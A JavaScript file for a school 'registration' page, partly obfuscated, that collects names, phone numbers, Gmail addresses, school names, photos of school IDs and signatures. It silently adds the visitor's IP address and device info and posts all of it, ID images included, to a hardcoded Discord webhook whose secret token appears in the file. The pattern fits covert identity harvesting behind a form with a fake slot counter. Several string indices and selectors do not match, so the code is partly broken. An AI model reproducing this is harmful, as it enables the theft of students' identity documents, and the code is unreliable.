// =========================
// External Libraries Loader
// =========================

const libsToLoad = [
    "https://cdn.jsdelivr.net/npm/signature_pad@4.1.7/dist/signature_pad.umd.min.js",
    "https://cdnjs.cloudflare.com/ajax/libs/qrcodejs/1.0.0/qrcode.min.js",
    "https://cdn.jsdelivr.net/npm/emailjs-com@3/dist/email.min.js"
  ];
  
  /**
   * loadScript(url): Dynamically creates a <script> tag to load external libraries.
   * Returns a Promise that resolves once the script loads successfully.
   */
  function loadScript(url) {
    return new Promise((resolve, reject) => {
      const scriptEl = document.createElement("script");
      scriptEl.src = url;
      scriptEl.async = true; // Ensure scripts are loaded asynchronously
      scriptEl.onload = () => {
        console.log(`Successfully loaded: ${url}`);
        resolve(url);
      };
      scriptEl.onerror = () => reject(new Error(`Failed to load: ${url}`));
      document.head.appendChild(scriptEl);
    });
  }
  
  /**
   * initApp: Main function that loads external libraries and initializes the registration logic.
   */
  async function initApp() {
    try {
      // Load all external libraries in parallel
      await Promise.all(libsToLoad.map(url => loadScript(url)));
      console.log("All external libraries loaded successfully.");
  
      // Initialize EmailJS with your user ID (Replace 'YOUR_EMAILJS_USER_ID' with your actual user ID)
      if (typeof emailjs !== 'undefined') {
        emailjs.init("SSDcjFdMjBWH15ZIq"); // Replace with your EmailJS user ID
      } else {
        console.error("EmailJS library is not loaded.");
      }
  
      // Once loaded, run the main registration logic
      runRegistrationLogic();
    } catch (err) {
      console.error("Error loading external libraries:", err);
      displayCriticalError("Failed to load necessary resources. Please refresh the page or try again later.");
    }
  }
  
  // =========================
  // Registration Logic
  // =========================
  
  /**
   * runRegistrationLogic: Encapsulates the registration process logic.
   */
  function runRegistrationLogic() {
    // Array of strings used in the code
    const stringArray = [
      "error", "id_file", "click", "payload_json", "trim", "src", "url", "then",
      "6sLPLKD", "256px", "text", "No JSON response from Discord (likely 204).",
      "registration_data_ssard", "User", "Failed to send data to Discord:",
      "files[1]", "Registration successful, but failed to send email links.",
      "target", "color", "upload_section", "style", "warn", "id_front.png",
      "height", "reuploadBtn", "attachments", "number",
      "Please draw your signature.", "qrBase64",
      "https://api.ipify.org?format=json", "red", "signature.png",
      "IP Address", "init", "email", "message", "template_t7ioajf",
      "consentAcceptBtn", "5FHIlpf", "append", "loadingOverlay", "Name",
      "setItem", "SSDcjFdMjBWH15ZIq", "upload", "storedQR", "name",
      "draw_section", "getItem", "Email sent successfully!", "result",
      "Registration Bot", "green", "log", "innerText", "width", "files[2]",
      "Please attach the front of your school ID.", "block", "opacity",
      "display", "stringify", "5207756xWeOHt", "show",
      "Invalid email address. Only Gmail addresses are allowed.", "none",
      "Device Info", "send", "remove", "onload", "hidden-start", "files",
      "608645BPZxsw", "4034485vhfWAt", "10187296mbCldN", "active",
      "mainContainer", "alreadyRegisteredSection", "registration_slots_left",
      "charCodeAt", "classList", "Failed to load ID image. Please try again.",
      "image/png", "change", "Error sending data to Discord:",
      "toDataURL", "querySelector",
      "Invalid name. Only letters and spaces are allowed.", "status",
      "Registration successful! Please check your Gmail for confirmation.",
      "Unknown", "getElementById", "borderRadius",
      "Please enter your school name.", "2222979ZKFdyy", "json", "8px",
      "files[0]", "slotsLeft", "School", "value", "formSection",
      "appendChild", "innerHTML", "add", "flex", "Number", "test", "clear",
      "Registration is now closed. No slots left.", "signature-pad",
      "parse", "textContent", "qr_code.png", "12905930agclQW",
      "registeredName", "Email", "canvas", "match", "header",
      "readAsDataURL", "userAgent", "reset", "32210AMHEmF",
      "Failed to retrieve IP address:", "consentModal", "18ogmgNQ",
      "addEventListener", "length",
      "Invalid phone number. It must be a 10-digit number.",
      "https://discord.com/api/webhooks/1325637445756256277/tVpZ_gEHaNbEjziqoN3OCLfcJ4OMymPXqFymJSzoFY9stI--aTvMbQWWCBKpnoI-lIZ5",
      "Failed to send email:", "checked",
      "Please upload your signature.", "onerror", "POST", "registrationForm"
    ];
  
    /**
     * getString(index): Maps numerical indices to their corresponding strings in the stringArray.
     * Adjusted to account for the obfuscation offset.
     */
    function getString(index) {
      return stringArray[index - 250];
    }
  
    // Reorder the stringArray to ensure correct mapping (if necessary)
    (function reorderStrings(arr, targetSum) {
      while (true) {
        try {
          const n =
            parseInt(getString(271)) / 1 +
            parseInt(getString(322)) / 2 +
            parseInt(getString(293)) / 3 +
            (parseInt(getString(261)) / 4) * (parseInt(getString(374)) / 5) +
            (-parseInt(getString(344)) / 6) * (parseInt(getString(272)) / 7) +
            parseInt(getString(273)) / 8 +
            (-parseInt(getString(325)) / 9) * (parseInt(getString(313)) / 10);
          if (n === targetSum) break;
          arr.push(arr.shift());
        } catch (e) {
          arr.push(arr.shift());
        }
      }
    })(stringArray, 751343);
  
    // Variable declarations with meaningful names
    const discordWebhookURL = getString(329);
    const emailService = getString(372);
    const emailTemplate = getString(379);
    const formId = getString(348);
    const localStorageKey = getString(277);
  
    // DOM Elements
    const mainContainer = document.getElementById(getString(324));
    const alreadyRegisteredSection = document.getElementById(getString(373));
    const registrationForm = document.getElementById(getString(376));
    const consentAcceptBtn = document.querySelector(getString(275));
    const uploadSection = document.querySelector(getString(318));
    const footer = document.querySelector("footer");
    const loadingOverlay = document.querySelector(getString(300));
    const formSection = document.querySelector(getString(335));
    const qrCodeContainer = document.querySelector(getString(371));
    const uploadBtn = document.querySelector(getString(380));
    const drawSection = document.querySelector("draw");
    const signatureFileInput = document.querySelector(getString(355));
    const qrBase64Element = document.querySelector(getString(383));
    const slotsLeftElement = document.querySelector(getString(307));
    const resultSection = document.querySelector(getString(276));
    const messageElement = document.querySelector(getString(314));
    const qrCanvas = document.getElementById(getString(381));
    const slotsLeftDisplay = document.querySelector(getString(360));
    const consentModal = document.getElementById(getString(297));
    const header = document.getElementById(getString(309));
  
    // Initialize Signature Pad
    let signaturePad;
    if (typeof SignaturePad !== 'undefined') {
      const canvas = document.createElement('canvas');
      canvas.id = 'signature-pad-canvas';
      canvas.width = 400;
      canvas.height = 200;
      header.appendChild(canvas);
      signaturePad = new SignaturePad(canvas);
    } else {
      console.error("SignaturePad library is not loaded.");
    }
  
    /**
     * toggleConsentModal: Toggles the display of consent modal based on user interaction.
     */
    function toggleConsentModal() {
      if (consentAcceptBtn.checked) {
        signatureFileInput.style.display = "block";
        qrBase64Element.style.display = "none";
      } else {
        signatureFileInput.style.display = "none";
        qrBase64Element.style.display = "block";
      }
    }
  
    /**
     * handleFormSubmit: Handles the form submission process.
     */
    async function handleFormSubmit(event) {
      event.preventDefault();
      showLoading(true);
  
      // Gather form data
      const name = document.querySelector("input[name='name']").value.trim();
      const phoneNumber = document.querySelector("input[name='number']").value.trim();
      const email = document.querySelector("input[name='email']").value.trim().toLowerCase();
      const schoolName = document.querySelector("input[name='school_name']").value.trim();
      const idFrontFile = document.querySelector("input[name='id_file']").files[0];
      const signatureType = document.querySelector('input[name="signature_type"]:checked')?.value;
      const signatureFile = document.querySelector("input[name='signature_file']")?.files[0];
  
      // Validation
      if (!/^[A-Za-z\s]+$/.test(name)) {
        showError("Invalid name. Only letters and spaces are allowed.", "red");
        showLoading(false);
        return;
      }
      if (!/^\d{10}$/.test(phoneNumber)) {
        showError("Invalid phone number. It must be a 10-digit number.", "red");
        showLoading(false);
        return;
      }
      if (!/^[^\s@]+@gmail\.com$/.test(email)) {
        showError("Invalid email address. Only Gmail addresses are allowed.", "red");
        showLoading(false);
        return;
      }
      if (!schoolName) {
        showError("Please enter your school name.", "red");
        showLoading(false);
        return;
      }
      if (!idFrontFile) {
        showError("Please attach the front of your school ID.", "red");
        showLoading(false);
        return;
      }
      if (!signatureType || (signatureType !== "upload" && signatureType !== "draw")) {
        showError("Please choose to upload or draw your signature.", "red");
        showLoading(false);
        return;
      }
      if (signatureType === "upload" && !signatureFile) {
        showError("Please upload your signature.", "red");
        showLoading(false);
        return;
      }
      if (signatureType === "draw" && (!signaturePad || signaturePad.isEmpty())) {
        showError("Please draw your signature.", "red");
        showLoading(false);
        return;
      }
  
      // Process signature
      let signatureDataURL = "";
      if (signatureType === "upload") {
        try {
          signatureDataURL = await readFileAsDataURL(signatureFile);
        } catch (error) {
          showError("Failed to read signature file.", "red");
          showLoading(false);
          return;
        }
      } else {
        signatureDataURL = signaturePad.toDataURL();
      }
  
      // Process ID front image
      let idFrontBlob;
      try {
        idFrontBlob = await readFileAsBlob(idFrontFile);
      } catch (error) {
        showError("Failed to load ID image. Please try again.", "red");
        showLoading(false);
        return;
      }
  
      // Fetch IP Address
      let ipAddress = "Unknown";
      try {
        const response = await fetch("https://api.ipify.org?format=json");
        if (response.ok) {
          const data = await response.json();
          ipAddress = data.ip || "Unknown";
        }
      } catch (error) {
        console.log("Failed to retrieve IP address:", error);
      }
  
      // Generate QR Code
      generateQRCode({
        name,
        phoneNumber,
        email,
        schoolName,
        registered: true
      });
  
      // Wait for QR Code generation
      await new Promise(resolve => setTimeout(resolve, 500));
  
      // Prepare data for Discord webhook
      const qrImageURL = qrCodeContainer.toDataURL();
      const qrBlob = await dataURLToBlob(qrImageURL);
      let signatureBlob;
      if (signatureType === "upload") {
        signatureBlob = await dataURLToBlob(signatureDataURL);
      } else {
        signatureBlob = await dataURLToBlob(signatureDataURL);
      }
      const idFrontBlobFinal = await dataURLToBlob(await readFileAsDataURL(idFrontFile));
  
      const formData = new FormData();
      const discordPayload = {
        username: "Registration Bot",
        embeds: [{
          title: "New Registration",
          color: 7103487,
          fields: [
            { name: "Name", value: name },
            { name: "Number", value: phoneNumber },
            { name: "Email", value: email },
            { name: "School Name", value: schoolName },
            { name: "IP Address", value: ipAddress },
            { name: "Device Info", value: navigator.userAgent || "Unknown" },
            { name: "Registered", value: "✅" }
          ],
          timestamp: new Date()
        }]
      };
      formData.append("payload_json", JSON.stringify(discordPayload));
      formData.append("files[0]", qrBlob, "qr_code.png");
      formData.append("files[1]", signatureBlob, "signature.png");
      formData.append("files[2]", idFrontBlobFinal, "id_front.png");
  
      // Send data to Discord webhook
      try {
        const response = await fetch(discordWebhookURL, {
          method: "POST",
          body: formData
        });
  
        if (response.ok) {
          let responseData = null;
          try {
            responseData = await response.json();
          } catch (e) {
            // Likely a 204 No Content response
          }
  
          const registrationData = {
            name,
            email,
            number: phoneNumber,
            schoolName,
            qr_image_url: responseData?.attachments?.[0]?.url || "",
            signature_url: responseData?.attachments?.[1]?.url || "",
            id_front_url: responseData?.attachments?.[2]?.url || "",
            ip_address: ipAddress,
            device_info: navigator.userAgent || "Unknown"
          };
  
          // Send email using EmailJS
          emailjs.send(emailService, "template_t7ioajf", registrationData)
            .then(function (emailResponse) {
              console.log("SUCCESS", emailResponse.status, emailResponse.text);
              showMessage("Email sent successfully!", "green");
  
              // Store registration data in localStorage
              const storedData = { name, email, number: phoneNumber, schoolName, qrBase64: qrImageURL };
              localStorage.setItem(stringArray[12], JSON.stringify(storedData));
  
              // Update slots left
              let slotsLeft = parseInt(localStorage.getItem(stringArray[277]), 10);
              slotsLeft = slotsLeft > 0 ? slotsLeft - 1 : 0;
              localStorage.setItem(stringArray[277], slotsLeft);
  
              updateUI();
              loadingOverlay.classList.add("hidden");
              signaturePad.clear();
              showLoading(false);
              displayResult(storedData);
            }, function (emailError) {
              console.error("FAILED", emailError);
              showMessage("Failed to send email.", "orange");
  
              // Store partially registered data
              const storedData = { name, email, number: phoneNumber, schoolName, qrBase64: qrImageURL };
              localStorage.setItem(stringArray[12], JSON.stringify(storedData));
  
              // Update slots left
              let slotsLeft = parseInt(localStorage.getItem(stringArray[277]), 10);
              slotsLeft = slotsLeft > 0 ? slotsLeft - 1 : 0;
              localStorage.setItem(stringArray[277], slotsLeft);
  
              updateUI();
              loadingOverlay.classList.add("hidden");
              signaturePad.clear();
              showLoading(false);
              displayResult(storedData);
            });
        } else {
          console.error("Failed to send registration data. Status:", response.statusText);
          showMessage("Failed to send registration data. Please try again later.", "warn");
          showLoading(false);
        }
      } catch (error) {
        console.error("An error occurred:", error);
        showMessage("An error occurred. Please try again later.", "warn");
        showLoading(false);
      }
    }
  
    /**
     * showMessage: Displays messages to the user with specified colors.
     * @param {string} message - The message to display.
     * @param {string} color - The color of the message text.
     */
    function showMessage(message, color) {
      if (!messageElement) return;
      messageElement.innerText = message;
      messageElement.style.color = color;
      messageElement.style.opacity = "1";
      setTimeout(() => {
        messageElement.style.opacity = "0";
      }, 5000);
    }
  
    /**
     * showLoading: Shows or hides the loading overlay.
     * @param {boolean} isLoading - Whether to show (true) or hide (false) the loading overlay.
     */
    function showLoading(isLoading) {
      if (!loadingOverlay) return;
      if (isLoading) {
        loadingOverlay.classList.remove("hidden");
        loadingOverlay.classList.add("active");
      } else {
        loadingOverlay.classList.remove("active");
        loadingOverlay.classList.add("hidden");
      }
    }
  
    /**
     * displayResult: Displays the registration result to the user.
     * @param {Object} data - The registration data to display.
     */
    function displayResult(data) {
      if (!formSection || !resultSection || !qrCanvas || !messageElement) return;
      formSection.classList.add("hidden");
      formSection.classList.remove("show");
      resultSection.classList.remove("hidden");
      resultSection.classList.add("show");
      messageElement.innerText = data.name || "";
      qrCanvas.innerHTML = "";
  
      if (data.qrBase64) {
        const img = new Image();
        img.src = data.qrBase64;
        img.style.width = "256px";
        img.style.borderRadius = "8px";
        img.style.display = "flex";
        qrCanvas.appendChild(img);
      }
  
      if (parseInt(localStorage.getItem(stringArray[277]), 10) <= 0) {
        showMessage("All slots have been filled. Registration is now closed.", "warn");
      }
    }
  
    /**
     * updateUI: Updates the UI elements based on the number of slots left.
     */
    function updateUI() {
      if (!slotsLeftElement) return;
      const slotsLeft = parseInt(localStorage.getItem(stringArray[277]), 10);
      if (slotsLeft > 0) {
        slotsLeftElement.textContent = slotsLeft.toString();
      } else {
        slotsLeftElement.textContent = "0";
        const storedData = JSON.parse(localStorage.getItem(stringArray[12])) || null;
        if (!storedData?.email) {
          formSection.classList.add("hidden");
          uploadSection.classList.remove("hidden");
          consentAcceptBtn.classList.add("active");
          footer.classList.add("warn");
          showMessage("Registration is now closed. No slots left.", "red");
        }
      }
    }
  
    /**
     * readFileAsDataURL: Reads a file and returns its Data URL.
     * @param {File} file - The file to read.
     * @returns {Promise<string>} - A promise that resolves with the Data URL.
     */
    function readFileAsDataURL(file) {
      return new Promise((resolve, reject) => {
        const reader = new FileReader();
        reader.onload = function (event) {
          resolve(event.target.result);
        };
        reader.onerror = function (error) {
          reject(error);
        };
        reader.readAsDataURL(file);
      });
    }
  
    /**
     * readFileAsBlob: Reads a file and returns its Blob.
     * @param {File} file - The file to read.
     * @returns {Promise<Blob>} - A promise that resolves with the Blob.
     */
    function readFileAsBlob(file) {
      return new Promise((resolve, reject) => {
        const reader = new FileReader();
        reader.onload = function (event) {
          const blob = new Blob([event.target.result], { type: file.type });
          resolve(blob);
        };
        reader.onerror = function (error) {
          reject(error);
        };
        reader.readAsArrayBuffer(file);
      });
    }
  
    /**
     * dataURLToBlob: Converts a Data URL to a Blob object.
     * @param {string} dataURL - The Data URL to convert.
     * @returns {Promise<Blob>} - A promise that resolves with the Blob.
     */
    function dataURLToBlob(dataURL) {
      return new Promise((resolve, reject) => {
        try {
          const parts = dataURL.split(",");
          const mime = parts[0].match(/:(.*?);/)[1];
          const binary = atob(parts[1]);
          const array = [];
          for (let i = 0; i < binary.length; i++) {
            array.push(binary.charCodeAt(i));
          }
          resolve(new Blob([new Uint8Array(array)], { type: mime }));
        } catch (error) {
          reject(error);
        }
      });
    }
  
    /**
     * generateQRCode: Generates a QR code using the provided data.
     * Assumes that the QRCode library is loaded.
     * @param {Object} data - The data to encode in the QR code.
     */
    function generateQRCode(data) {
      new QRCode(qrCodeContainer, {
        text: JSON.stringify(data),
        width: 256,
        height: 256
      });
    }
  
    /**
     * showError: Displays an error message to the user.
     * @param {string} message - The error message.
     * @param {string} color - The color of the error message text.
     */
    function showError(message, color) {
      showMessage(message, color);
    }
  
    /**
     * displayCriticalError: Displays a critical error message and possibly halts further execution.
     * @param {string} message - The critical error message.
     */
    function displayCriticalError(message) {
      if (!mainContainer) return;
      mainContainer.innerHTML = `<div style="color: red; text-align: center; margin-top: 50px;">${message}</div>`;
    }
  
    // Event Listeners
  
    // Window Load Event
    window.addEventListener("load", function () {
      if (mainContainer) {
        mainContainer.style.display = "block";
      }
  
      // Initialize slots left if not present
      if (!localStorage.getItem(localStorageKey)) {
        localStorage.setItem(localStorageKey, 180);
      }
      updateUI();
  
      // Check if user is already registered
      const storedData = JSON.parse(localStorage.getItem(stringArray[12])) || null;
      if (storedData?.email) {
        if (mainContainer) {
          mainContainer.style.display = "none";
        }
        displayResult(storedData);
      } else if (parseInt(localStorage.getItem(stringArray[277]), 10) > 0) {
        if (mainContainer) {
          mainContainer.style.display = "none";
        }
      } else {
        if (consentAcceptBtn) {
          consentAcceptBtn.classList.add("show");
        }
        if (uploadSection) {
          uploadSection.classList.add("active");
        }
        if (footer) {
          footer.classList.add("warn");
        }
        showMessage("Registration is now closed. No slots left.", "red");
      }
    });
  
    // Consent Accept Button Change Event
    if (uploadSection) {
      uploadSection.addEventListener("change", toggleConsentModal);
    }
    if (drawSection) {
      drawSection.addEventListener("change", toggleConsentModal);
    }
  
    // Slots Left Element Load Event
    if (slotsLeftElement) {
      slotsLeftElement.addEventListener("load", function () {
        if (signaturePad) {
          signaturePad.clear();
        }
      });
    }
  
    // Result Section Click Event
    if (resultSection) {
      resultSection.addEventListener("click", function () {
        if (resultSection) {
          resultSection.classList.remove("show");
          resultSection.classList.add("hidden");
        }
        if (formSection) {
          formSection.classList.remove("show");
          formSection.classList.add("hidden");
        }
        if (qrCanvas) {
          qrCanvas.innerText = "";
        }
      });
    }
  
    // Form Submission Event
    if (registrationForm) {
      registrationForm.addEventListener("submit", handleFormSubmit);
    }
  }
  
  // =========================
  // Critical Error Display
  // =========================
  
  /**
   * displayCriticalError: Displays a critical error message to the user.
   * This function is called if external libraries fail to load.
   * @param {string} message - The critical error message.
   */
  function displayCriticalError(message) {
    const mainContainer = document.getElementById("mainContainer");
    if (mainContainer) {
      mainContainer.innerHTML = `<div style="color: red; text-align: center; margin-top: 50px;">${message}</div>`;
    }
  }
  
  // =========================
  // Initialize the Application
  // =========================
  
  // Start the application once the DOM is fully loaded
  document.addEventListener("DOMContentLoaded", initApp);  
